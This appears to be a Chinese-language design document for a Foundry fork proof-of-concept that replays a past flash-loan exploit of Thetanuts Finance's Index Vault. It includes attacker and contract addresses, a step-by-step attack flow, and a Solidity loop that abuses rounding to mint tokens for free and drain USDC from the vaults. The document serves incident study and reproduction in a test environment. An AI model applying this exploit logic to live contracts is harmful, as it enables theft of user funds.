# Thetanuts Finance Fork PoC 设计文档

**日期：** 2026-06-16  
**状态：** 待 review  
**关联文档：** [attack-event/ThetanutsFinance.md](../../../attack-event/ThetanutsFinance.md)

---

## 1. 目标

在 Foundry fork 环境中复现 Thetanuts Finance 遗留 Index Vault 攻击，使攻击者 EOA 获利接近链上数值（~105,471 USDC + 部分 Vault Token）。

### 成功标准

- Fork 区块：`25323328`（攻击交易 `25323329` 的前一块）
- 使用 `vm.startPrank` 模拟攻击者 EOA `0x30498e4466789E534c72e03B52A16c978655b41e`
- 自写攻击合约，链上关键参数硬编码，mint 循环算法驱动
- 断言 PLAYER 获得 USDC ≈ `105_471_499_078`（±1% 容差）

### 非目标

- 不搬运攻击者原始字节码
- 不复现双合约编排结构（Orchestrator + Executor）
- 不覆盖白帽救援交易

---

## 2. 目录结构

```
contracts/src/ThetanutsFi/
├── Constants.sol
└── interfaces/
    ├── IIndexToken.sol       # mint, claim, totalSupply
    ├── IVaultToken.sol       # initWithdraw
    ├── ILendingRouter.sol    # flashLoan (Aave V3 风格)
    └── IFlashLoanReceiver.sol # executeOperation 回调

contracts/test/ThetanutsFi/
├── ThetanutsFiChallenge.t.sol  # fork 测试入口
└── AttackThetanutsFi.sol       # 攻击逻辑
```

接口仅包含攻击路径所需的最小 ABI，从链上 trace / Etherscan 提取，不引入完整协议源码。

---

## 3. 链上常量

| 常量 | 地址 / 数值 | 说明 |
|------|------------|------|
| `FORK_BLOCK` | `25_323_328` | 攻击前一块 |
| `PLAYER` | `0x30498e4466789E534c72e03B52A16c978655b41e` | 攻击者 EOA |
| `INDEX_TOKEN` | `0x075dA7e9EFEA6813aB0B2680423df75150120d12` | TN-IDX-USDC-PUT |
| `LENDING_ROUTER` | `0x2ca7641b841a79cc70220ce838d0b9f8197accda` | 闪电贷 Router |
| `USDC` | `0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48` | 变现资产 |
| `VAULT_BTCUSD` | `0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59` | BTC Put Vault |
| `VAULT_ETHUSD` | `0xE1c93dE547cc85cbd568295f6cc322b1dbBCf8Ae` | ETH Put Vault |
| `FLASH_LOAN_AMOUNT` | `153_054_600_569` | 借入 Index Token |
| `FLASH_LOAN_PREMIUM` | `137_749_140` | 闪电贷手续费 |
| `REPAY_TARGET` | `153_192_349_709` | AMOUNT + PREMIUM |

Vault Token 地址（claim 拆包所得，实现时从 trace 确认后写入 Constants）：

| Token | 数量（最小单位） |
|-------|-----------------|
| TN-CSCPv1-BTCUSD | `49_716_431_047` |
| TN-CSCPv1-ETHUSD | `23_955_277_333` |
| TN-CSCPv1-AVAXUSD | `6_378_688_541` |
| TN-CSCPv1-BNBUSD | `17_186_382_409` |
| TN-CSCPv1-MATICUSD | `10_028_704_387` |

---

## 4. 接口定义

### IIndexToken

```solidity
interface IIndexToken {
    function mint(uint256 amount) external;
    function claim(uint256 tokenId) external;
    function totalSupply() external view returns (uint256);
}
```

`claim` 参数名与链上一致（`tokenId` = 销毁的 Index 份额数量）。

### IVaultToken

```solidity
interface IVaultToken {
    function initWithdraw(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}
```

链上事件名为 `Withdraw`，函数名为 `initWithdraw`。

### ILendingRouter + IFlashLoanReceiver

Aave V3 Pool 风格：

```solidity
interface ILendingRouter {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}
```

实现时若 Router 实际签名不同，以链上 ABI 为准调整。

---

## 5. 攻击流程

### 5.1 顶层

```
PLAYER (prank)
  └─ new AttackThetanutsFi()
  └─ attack(PLAYER)
       └─ flashLoan(INDEX_TOKEN, 153_054_600_569)
            └─ executeOperation 回调
```

### 5.2 回调内步骤

1. **claim(FLASH_LOAN_AMOUNT)** — 烧掉借来的 Index Token，拆出 5 种 Vault Token，`totalSupply` 进入低供应量畸形状态
2. **_freeMintLoop(REPAY_TARGET)** — 算法驱动零成本 mint，凑够还贷数量
3. **approve INDEX → LendingRouter** — 授权还贷
4. **initWithdraw** — 对 BTCUSD、ETHUSD Vault Token 全额 `initWithdraw`
5. **transfer** — USDC 及剩余 AVAX/BNB/MATIC Vault Token 转至 `receiver`（PLAYER）
6. **return true**

### 5.3 数据流

```
LendingRouter ──flashLoan──▶ AttackContract
AttackContract ──claim──▶ IndexToken ──▶ 5x VaultToken
AttackContract ──mint loop──▶ IndexToken (零成本)
AttackContract ──repay──▶ LendingRouter
AttackContract ──initWithdraw──▶ Vault(BTC/ETH) ──▶ USDC
AttackContract ──transfer──▶ PLAYER
```

---

## 6. Mint 算法（算法驱动）

### 原理

```
depositAmount = backing * mintAmount / totalSupply
```

整数除法向下取整。`claim` 后 `totalSupply` 极低，满足 `backing × amount < totalSupply` 时 `depositAmount = 0`。

### 实现策略

```solidity
function _freeMintLoop(uint256 repayTarget) internal {
    uint256 minted;
    uint256 amount = 2;

    while (minted < repayTarget) {
        if (amount > repayTarget - minted) {
            amount = repayTarget - minted;
        }
        IIndexToken(INDEX_TOKEN).mint(amount);
        minted += amount;
        amount *= 2;
    }
}
```

### 优化点（实现阶段）

- 每次 mint 前读取 `totalSupply()`，可选读取 `backing`（`totalAssets()` 或底层余额）验证本次 mint 为零成本
- 末轮精确补齐 `repayTarget - minted`
- 设置最大迭代次数（~200）防止 gas 炸弹，超限 `revert MintLoopFailed()`

### 风险

算法驱动 mint 次数/金额可能与链上 trace 不完全一致，因此 USDC 断言使用 ±1% 容差而非精确相等。

---

## 7. 测试设计

### ThetanutsFiChallenge.t.sol

沿用 `LiFiDiamondChallenge` / `SpectraChallenge` 模式：

```solidity
modifier checkSolvedByPlayer() {
    _assertInitialState();
    vm.startPrank(PLAYER, PLAYER);
    _;
    vm.stopPrank();
    _isSolved();
}

function setUp() public {
    uint256 forkId = vm.createFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
    vm.selectFork(forkId);
}

function testAttack() public checkSolvedByPlayer {
    AttackThetanutsFi attack = new AttackThetanutsFi();
    attack.attack(PLAYER);
}
```

### 初始状态断言

```solidity
assertGt(IERC20(USDC).balanceOf(VAULT_BTCUSD), 70_000e6);
assertGt(IERC20(USDC).balanceOf(VAULT_ETHUSD), 35_000e6);
```

### 成功断言

| 断言项 | 期望值 | 容差 |
|--------|--------|------|
| `USDC.balanceOf(PLAYER)` | `105_471_499_078` | ±1% (`assertApproxEqRel`) |
| `USDC.balanceOf(VAULT_BTCUSD)` | → 0 或接近 0 | — |
| `USDC.balanceOf(VAULT_ETHUSD)` | → 0 或接近 0 | — |

可选：断言 PLAYER 持有 AVAX/BNB/MATIC Vault Token（链上未变现部分）。

### 运行命令

```shell
forge test --match-contract ThetanutsFiChallenge -vvv
```

依赖 `.env` 中 `ETH_RPC_URL` 指向 Ethereum Mainnet。

---

## 8. 错误处理

| 场景 | 处理 |
|------|------|
| mint 循环超限 | `revert MintLoopFailed()` |
| flashLoan 回调非 Router 调用 | `onlyRouter` modifier |
| initWithdraw 失败 | 自然 revert，暴露接口/参数问题 |
| RPC 不可用 | `setUp` 失败，README 注明依赖 |

---

## 9. 实现顺序

1. 创建 `Constants.sol` 与接口文件
2. 实现 `AttackThetanutsFi.sol`（先写 flashLoan 骨架，再补回调逻辑）
3. 实现 `ThetanutsFiChallenge.t.sol`
4. fork 运行，根据 revert 调整接口签名与 Vault Token 地址
5. 调优 mint 算法直至 USDC 断言通过
6. 更新 `README.md` 索引 PoC 路径

---

## 10. 决策记录

| 决策 | 选择 | 理由 |
|------|------|------|
| 成功标准 | 链上对齐（~105k USDC） | 用户指定 |
| 实现方式 | 混合（自写合约 + 链上参数） | 可读可调试，符合仓库风格 |
| mint 循环 | 算法驱动 | 用户指定，更通用 |
| 架构 | 单合约 Attack | YAGNI，足够完成 PoC |
| 调用者 | prank 攻击者 EOA | 与 LI.FI/Spectra 一致 |
| Fork 区块 | 25323328 | 攻击 tx 前一块 |
